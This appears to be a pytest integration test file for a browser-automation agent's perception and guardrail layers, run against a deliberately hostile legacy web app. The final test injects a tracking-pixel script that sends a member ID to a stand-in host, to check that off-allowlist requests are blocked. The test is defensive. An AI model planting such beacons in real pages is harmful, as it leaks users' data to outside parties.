"""Surface layer against the real hostile app in a real browser.

These are the tests that justify the perception design. Three of them are load-bearing
for the whole project:

  * `test_no_churning_ids_leak_into_observations` - proves the abstraction actually holds
  * `test_fingerprint_is_stable_across_rerenders` - proves the fingerprint tracks screen
    *shape* rather than markup, which is what makes no-progress and drift detection work
  * `test_results_grid_carries_row_and_column_context` - the raw material for locator
    tier 4, the only reliable way to target a control in a legacy data grid
"""

from __future__ import annotations

from collections.abc import AsyncIterator

import pytest
import pytest_asyncio

from cua.surface.base import Action, ActionType, ElementNode, Observation
from cua.surface.web_surface import WebSurface

pytestmark = [pytest.mark.integration]


@pytest_asyncio.fixture
async def surface() -> AsyncIterator[WebSurface]:
    surf, pw, browser = await WebSurface.launch()
    try:
        yield surf
    finally:
        await surf.close()
        await browser.close()
        await pw.stop()


def find(obs: Observation, role: str, name: str) -> ElementNode | None:
    return next(
        (e for e in obs.elements if e.role == role and e.name.lower() == name.lower()), None
    )


async def sign_in(surface: WebSurface, base_url: str, tenant: str = "meridian") -> Observation:
    """Idempotent: an already-authenticated session lands on the frameset, not a form."""
    await surface.act(Action(type=ActionType.NAVIGATE, url=f"{base_url}/tenants/{tenant}/"))
    obs = await surface.observe()

    user = find(obs, "textbox", "User ID")
    pwd = find(obs, "textbox", "Password")
    btn = find(obs, "button", "Sign In")
    if not (user and pwd and btn):
        return obs

    await surface.act(Action(type=ActionType.FILL, ref=user.ref, text="operator"))
    await surface.act(Action(type=ActionType.FILL, ref=pwd.ref, text="demo-pass"))
    await surface.act(Action(type=ActionType.CLICK, ref=btn.ref))
    return await surface.observe()


async def search_for(surface: WebSurface, base_url: str, member_id: str) -> Observation:
    obs = await sign_in(surface, base_url)
    field = find(obs, "textbox", "Member ID")
    button = find(obs, "button", "Search")
    assert field and button
    await surface.act(Action(type=ActionType.FILL, ref=field.ref, text=member_id))
    await surface.act(Action(type=ActionType.CLICK, ref=button.ref))
    return await surface.observe()


# ------------------------------------------------------------------ the abstraction


async def test_observes_inside_a_nested_frame(surface: WebSurface, base_url: str) -> None:
    obs = await sign_in(surface, base_url)

    frames = {"/".join(p) or "main" for p in obs.frame_paths}
    assert {"main", "navFrame", "contentFrame"} <= frames

    field = find(obs, "textbox", "Member ID")
    assert field is not None, "search field inside contentFrame was not perceived"
    assert field.frame_path == ["contentFrame"]
    assert field.section == "Member Search"


async def test_no_churning_ids_leak_into_observations(surface: WebSurface, base_url: str) -> None:
    """The abstraction is only real if unstable markup cannot escape it.

    Every screen is full of ctl00_..._ctlNN_... ids and junk class names. None of them
    may appear anywhere in an ElementNode - not in a name, not in a value, not in any
    field - or a downstream component could come to depend on one.
    """
    obs = await search_for(surface, base_url, "100042")
    blob = obs.model_dump_json()

    assert "ctl00_" not in blob, "a churning ASP.NET control id reached the Observation"
    assert "data-cua-ref" not in blob
    for banned in ("css", "xpath", "selector"):
        assert banned not in {f.lower() for f in ElementNode.model_fields}


async def test_fingerprint_is_stable_across_rerenders(surface: WebSurface, base_url: str) -> None:
    """Reloading the same screen churns every id, but the fingerprint must not move.

    The fingerprint hashes role+name+frame - the *shape* of the screen. If it tracked
    markup it would change on every render and no-progress detection would fire
    constantly; if it ignored screens entirely, drift detection would never fire.
    """
    obs1 = await sign_in(surface, base_url)
    await surface.act(Action(type=ActionType.NAVIGATE, url=f"{base_url}/tenants/meridian/home"))
    obs2 = await surface.observe()

    assert obs1.fingerprint == obs2.fingerprint


async def test_fingerprint_changes_between_different_screens(
    surface: WebSurface, base_url: str
) -> None:
    home = await sign_in(surface, base_url)
    results = await search_for(surface, base_url, "100042")
    assert home.fingerprint != results.fingerprint


async def test_typing_does_not_change_the_fingerprint(surface: WebSurface, base_url: str) -> None:
    """Values are excluded on purpose: filling a field is progress, but it is the same
    screen, and a fingerprint that moved would mask a genuine dead end."""
    obs = await sign_in(surface, base_url)
    field = find(obs, "textbox", "Member ID")
    assert field
    await surface.act(Action(type=ActionType.FILL, ref=field.ref, text="100042"))
    after = await surface.observe()

    assert obs.fingerprint == after.fingerprint
    assert find(after, "textbox", "Member ID").value == "100042"  # type: ignore[union-attr]


# ------------------------------------------------------------------ locator raw material


async def test_results_grid_carries_row_and_column_context(
    surface: WebSurface, base_url: str
) -> None:
    """Tier 4's raw material.

    The View link's accessible name is just "View" - identical on every row and useless
    on its own. What makes it targetable is the row it sits in, addressed by data.
    """
    obs = await search_for(surface, base_url, "100042")

    view = find(obs, "link", "View")
    assert view is not None, "results grid View link not perceived"
    assert view.row_context is not None, "no row context - tier 4 would be impossible"
    assert view.row_context.row_key["Member ID"] == "100042"
    assert view.row_context.row_key["Name"] == "J. RIVERA"
    assert view.row_context.column_header == "Action"


async def test_layout_tables_produce_no_row_context(surface: WebSurface, base_url: str) -> None:
    """Legacy apps position everything with tables. Inventing column names from a table
    that has no headers would produce locators that look precise and are not.

    Run against the results screen specifically: that is where a layout row *contains*
    a real data grid, which is the case that tricks a naive descendant search into
    treating page chrome as a table row.
    """
    obs = await search_for(surface, base_url, "100042")
    chrome = [e for e in obs.elements if e.role == "cell" and "CoreLink" in e.name]
    assert chrome, "expected the footer chrome cell"
    for cell in chrome:
        assert cell.row_context is None, (
            f"page chrome picked up a bogus row context: {cell.row_context}"
        )

    # Only the genuine grid rows carry context, and their keys are real column headers.
    with_ctx = [e for e in obs.elements if e.row_context is not None]
    assert with_ctx, "the real data grid should still produce row context"
    for node in with_ctx:
        assert set(node.row_context.row_key) <= {  # type: ignore[union-attr]
            "Member ID",
            "Name",
            "Branch",
            "Status",
            "Action",
        }


async def test_savings_balance_is_readable_from_the_detail_screen(
    surface: WebSurface, base_url: str
) -> None:
    obs = await search_for(surface, base_url, "100042")
    view = find(obs, "link", "View")
    assert view
    await surface.act(Action(type=ActionType.CLICK, ref=view.ref))
    detail = await surface.observe()

    assert find(detail, "heading", "Member Detail") is not None
    balance = next((e for e in detail.elements if e.role == "cell" and "4,182.55" in e.name), None)
    assert balance is not None, "savings balance not perceivable"
    assert balance.row_context is not None
    assert balance.row_context.row_key["Account"] == "Savings"


# ------------------------------------------------------------------ act semantics


async def test_frame_navigation_is_detected_even_though_the_page_url_is_unchanged(
    surface: WebSurface, base_url: str
) -> None:
    """The app navigates the content frame, leaving the top-level URL alone. Anything
    watching only page.url would conclude nothing happened."""
    obs = await sign_in(surface, base_url)
    top_before = surface.page.url

    field = find(obs, "textbox", "Member ID")
    button = find(obs, "button", "Search")
    assert field and button
    await surface.act(Action(type=ActionType.FILL, ref=field.ref, text="100042"))
    result = await surface.act(Action(type=ActionType.CLICK, ref=button.ref))

    assert result.ok
    assert result.navigated, "frame navigation went undetected"
    assert surface.page.url == top_before


async def test_stale_refs_fail_loudly_rather_than_acting_on_the_wrong_thing(
    surface: WebSurface, base_url: str
) -> None:
    """Refs are per-observation. Reusing one after the screen changed is a bug, and it
    must surface as an error rather than silently hitting whatever now occupies e11."""
    obs = await sign_in(surface, base_url)
    button = find(obs, "button", "Search")
    assert button

    await search_for(surface, base_url, "100042")  # new observation invalidates old refs
    result = await surface.act(Action(type=ActionType.CLICK, ref="e999"))

    assert not result.ok
    assert "unknown ref" in (result.error or "")


async def test_password_values_are_never_read_back(surface: WebSurface, base_url: str) -> None:
    """Perception must not become an exfiltration path: a filled password field is read
    back as empty, so a secret cannot reach a log, an artifact, or a prompt."""
    await surface.act(Action(type=ActionType.NAVIGATE, url=f"{base_url}/tenants/meridian/"))
    obs = await surface.observe()
    pwd = find(obs, "textbox", "Password")
    assert pwd

    await surface.act(Action(type=ActionType.FILL, ref=pwd.ref, text="hunter2-secret"))
    after = await surface.observe()

    assert "hunter2-secret" not in after.model_dump_json()


# ------------------------------------------------------------------ tenant variance


async def test_the_same_screen_reads_differently_across_tenants(
    surface: WebSurface, base_url: str
) -> None:
    """Same vendor product, different configuration. This is what a tenant overlay has
    to absorb, and why an exact-name locator alone is not enough."""
    obs = await sign_in(surface, base_url, tenant="lakeside")

    assert find(obs, "button", "Find Member") is not None
    assert find(obs, "button", "Search") is None
    assert find(obs, "textbox", "Member Number") is not None
    assert find(obs, "textbox", "Member ID") is None
    assert find(obs, "combobox", "Branch") is not None


async def test_network_layer_blocks_requests_to_off_allowlist_origins(
    base_url: str,
) -> None:
    """Guardrail layer 2, against a real browser.

    The page tries to load an image from an origin the policy does not allow. No action
    requested it - the *page* did - so only the network-level guard can stop it. This is
    the shape of an injected beacon in a legacy app's free-text field.
    """
    from cua.policy.engine import PolicyEngine, load_policy
    from cua.surface.web_surface import WebSurface

    blocked: list[str] = []
    engine = PolicyEngine(load_policy())
    surf, pw, browser = await WebSurface.launch(
        allow_request=engine.allows_request,
        on_blocked_request=blocked.append,
    )
    try:
        await surf.act(Action(type=ActionType.NAVIGATE, url=f"{base_url}/tenants/meridian/"))
        await surf.observe()  # settles; evaluate needs a stable execution context
        await surf.page.wait_for_load_state("load")

        # Same shape as an injected tracking pixel exfiltrating a member id.
        await surf.page.evaluate(
            "() => { const i = document.createElement('img');"
            "i.src = 'https://telemetry.example.com/collect?member=100042';"
            "document.body.appendChild(i); }"
        )
        await surf.observe()  # settles again, so the blocked request has fired
    finally:
        await surf.close()
        await browser.close()
        await pw.stop()

    assert any("telemetry.example.com" in url for url in blocked), (
        f"off-allowlist request was not blocked; blocked={blocked}"
    )
